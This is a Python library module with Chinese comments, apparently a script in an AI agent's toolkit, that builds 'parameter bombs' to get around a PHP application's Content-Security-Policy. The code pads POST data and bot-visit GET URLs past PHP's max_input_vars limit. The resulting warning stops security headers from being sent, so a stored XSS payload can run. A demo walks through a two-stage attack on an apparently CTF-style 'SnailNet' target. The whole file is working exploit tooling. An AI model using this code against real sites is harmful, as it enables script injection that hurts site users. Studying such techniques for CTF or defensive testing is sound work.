"""summary: PHP max_input_vars 参数炸弹生成器

description:
  用于 PHP 应用中利用 max_input_vars（默认 1000）限制绕过 CSP 等安全头。

  当请求参数总数超过 max_input_vars 时，PHP 触发 E_WARNING →
  输出导致 headers already sent → 后续设置安全头的代码失败 →
  响应中缺少 CSP 头 → XSS 可正常执行。

  提供两个核心功能：
  1. 生成带参数炸弹的 POST 数据（用于提交恶意内容时绕过 CSP）
  2. 生成带参数炸弹的 GET URL（用于 Bot 访问时绕过 CSP）

  依赖: 无第三方依赖

  调用方式:
    import sys
    sys.path.insert(0, "$AGENT_DIR/scripts")
    from param_bomb import build_bomb_post_data, build_bomb_get_url

usage:
  作为库模块被 import。

level: intermediate
"""

from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
from typing import Optional


# PHP 默认 max_input_vars 值
DEFAULT_MAX_INPUT_VARS = 1000


def count_existing_params(
    get_params: Optional[dict] = None,
    post_params: Optional[dict] = None,
    cookie_count: int = 1,
) -> int:
    """计算现有参数总数。

    PHP 的 max_input_vars 计算所有来源的参数：
    总数 = GET 参数数 + POST 参数数 + Cookie 数

    Args:
        get_params: GET 参数字典
        post_params: POST 参数字典
        cookie_count: Cookie 数量（通常至少 1 个 PHPSESSID）

    Returns:
        参数总数
    """
    get_count = len(get_params) if get_params else 0
    post_count = len(post_params) if post_params else 0
    return get_count + post_count + cookie_count


def build_bomb_post_data(
    important_params: dict,
    max_input_vars: int = DEFAULT_MAX_INPUT_VARS,
    cookie_count: int = 1,
    get_params: Optional[dict] = None,
    junk_prefix: str = "j",
    overflow: int = 5,
) -> dict:
    """生成带参数炸弹的 POST 数据。

    在重要的 POST 参数之后添加足够多的垃圾参数，使总数超过 max_input_vars。

    Args:
        important_params: 重要的 POST 参数（如 csrf_token, content_markdown）
                         这些参数会放在前面，确保被正常解析
        max_input_vars: PHP 的 max_input_vars 配置值（默认 1000）
        cookie_count: Cookie 数量
        get_params: GET 参数（也会计入总数）
        junk_prefix: 垃圾参数的前缀
        overflow: 超出限制的额外参数数量（确保触发 WARNING）

    Returns:
        包含重要参数 + 垃圾参数的完整 POST 数据字典

    示例:
        >>> data = build_bomb_post_data(
        ...     {'csrf_token': 'abc', 'content_markdown': 'XSS_PAYLOAD'},
        ...     cookie_count=1,
        ...     get_params={'action': 'join-request'}
        ... )
        >>> len(data)  # 总参数数 > 1000
    """
    existing = count_existing_params(get_params, important_params, cookie_count)
    needed = max_input_vars - existing + overflow

    if needed <= 0:
        # 已有参数已经超过限制，不需要额外参数
        return dict(important_params)

    # 重要参数放前面（确保被 PHP 正常解析）
    result = dict(important_params)

    # 添加垃圾参数
    for i in range(needed):
        result[f"{junk_prefix}{i}"] = "x"

    return result


def build_bomb_get_url(
    base_url: str,
    params: dict,
    max_input_vars: int = DEFAULT_MAX_INPUT_VARS,
    cookie_count: int = 1,
    junk_prefix: str = "p",
    overflow: int = 5,
) -> str:
    """生成带参数炸弹的 GET URL。

    在正常 GET 参数之后添加大量垃圾参数，使总数超过 max_input_vars。
    用于构造 Bot 访问的 URL（Bot 访问页面时也需要绕过 CSP）。

    Args:
        base_url: 基础 URL（如 'http://nginx/index.php'）
        params: 正常的 GET 参数（如 {'action': 'view-request', 'id': 'uuid'}）
        max_input_vars: PHP 的 max_input_vars 配置值
        cookie_count: Cookie 数量
        junk_prefix: 垃圾参数前缀
        overflow: 超出限制的额外数量

    Returns:
        带参数炸弹的完整 URL

    示例:
        >>> url = build_bomb_get_url(
        ...     'http://nginx/index.php',
        ...     {'action': 'view-request', 'id': 'a1b2c3...'},
        ... )
        >>> # URL 类似: http://nginx/index.php?action=view-request&id=a1b2c3&p0=v&p1=v&...
    """
    existing = cookie_count + len(params)
    needed = max_input_vars - existing + overflow

    # 合并正常参数和垃圾参数
    all_params = dict(params)
    for i in range(max(0, needed)):
        all_params[f"{junk_prefix}{i}"] = "v"

    # 构造 URL
    parsed = urlparse(base_url)
    query = urlencode(all_params)
    bomb_url = urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        query,
        parsed.fragment,
    ))

    return bomb_url


def build_two_stage_bomb(
    submit_url: str,
    submit_post_data: dict,
    view_url: str,
    view_params: dict,
    max_input_vars: int = DEFAULT_MAX_INPUT_VARS,
    cookie_count: int = 1,
) -> tuple:
    """生成两阶段参数炸弹（提交时 + Bot 访问时）。

    在 Stored XSS + CSP 绕过场景中，需要两次绕过 CSP：
    1. 提交恶意内容时（POST）—— 绕过 CSP 让 payload 被存储
    2. Bot 访问页面时（GET）—— 绕过 CSP 让 XSS 执行

    Args:
        submit_url: 提交内容的 URL（POST 请求目标）
        submit_post_data: 提交的重要 POST 参数
        view_url: Bot 查看页面的 URL（GET 请求）
        view_params: 查看页面的 GET 参数
        max_input_vars: PHP 的 max_input_vars 值
        cookie_count: Cookie 数量

    Returns:
        (bombed_post_data, bombed_get_url) 元组
    """
    # 解析 submit_url 中的 GET 参数
    parsed = urlparse(submit_url)
    get_params = parse_qs(parsed.query)
    # parse_qs 返回的值是列表，转换为单值
    get_params_flat = {k: v[0] for k, v in get_params.items()} if get_params else {}

    # 阶段 1：POST 参数炸弹
    bombed_post = build_bomb_post_data(
        submit_post_data,
        max_input_vars=max_input_vars,
        cookie_count=cookie_count,
        get_params=get_params_flat,
    )

    # 阶段 2：GET 参数炸弹
    bombed_url = build_bomb_get_url(
        view_url,
        view_params,
        max_input_vars=max_input_vars,
        cookie_count=cookie_count,
    )

    return bombed_post, bombed_url


def estimate_param_count(
    get_params: Optional[dict] = None,
    post_params: Optional[dict] = None,
    cookie_count: int = 1,
) -> dict:
    """估算参数计数，用于调试和验证。

    Args:
        get_params: GET 参数
        post_params: POST 参数
        cookie_count: Cookie 数

    Returns:
        计数详情字典
    """
    get_count = len(get_params) if get_params else 0
    post_count = len(post_params) if post_params else 0
    total = get_count + post_count + cookie_count

    return {
        "get_params": get_count,
        "post_params": post_count,
        "cookies": cookie_count,
        "total": total,
        "exceeds_default": total > DEFAULT_MAX_INPUT_VARS,
        "needed_junk": max(0, DEFAULT_MAX_INPUT_VARS - total + 5),
    }


if __name__ == "__main__":
    # 演示：模拟 SnailNet 场景
    print("=" * 60)
    print("PHP max_input_vars 参数炸弹生成器 - 演示")
    print("=" * 60)

    # 阶段 1：POST 提交 Join Request
    print("\n--- 阶段 1：POST 提交恶意内容 ---")
    post_data = build_bomb_post_data(
        {"csrf_token": "abc123", "content_markdown": "XSS_PAYLOAD"},
        cookie_count=1,
        get_params={"action": "join-request"},
    )
    count = estimate_param_count(
        get_params={"action": "join-request"},
        post_params={"csrf_token": "abc123", "content_markdown": "XSS_PAYLOAD"},
        cookie_count=1,
    )
    print(f"  原始参数: GET={count['get_params']}, POST={count['post_params']}, "
          f"Cookie={count['cookies']}, 总计={count['total']}")
    print(f"  炸弹 POST 参数数: {len(post_data)} (含 {len(post_data) - 2} 个垃圾参数)")

    # 阶段 2：GET Bot 访问
    print("\n--- 阶段 2：Bot GET 访问页面 ---")
    bomb_url = build_bomb_get_url(
        "http://nginx/index.php",
        {"action": "view-request", "id": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"},
        cookie_count=1,
    )
    print(f"  Bot URL 长度: {len(bomb_url)} 字符")
    print(f"  Bot URL 前 100 字符: {bomb_url[:100]}...")

    # 两阶段组合
    print("\n--- 两阶段组合 ---")
    bombed_post, bombed_url = build_two_stage_bomb(
        submit_url="http://target/index.php?action=join-request",
        submit_post_data={"csrf_token": "abc", "content_markdown": "XSS"},
        view_url="http://nginx/index.php",
        view_params={"action": "view-request", "id": "uuid123"},
    )
    print(f"  POST 参数数: {len(bombed_post)}")
    print(f"  GET URL 长度: {len(bombed_url)}")
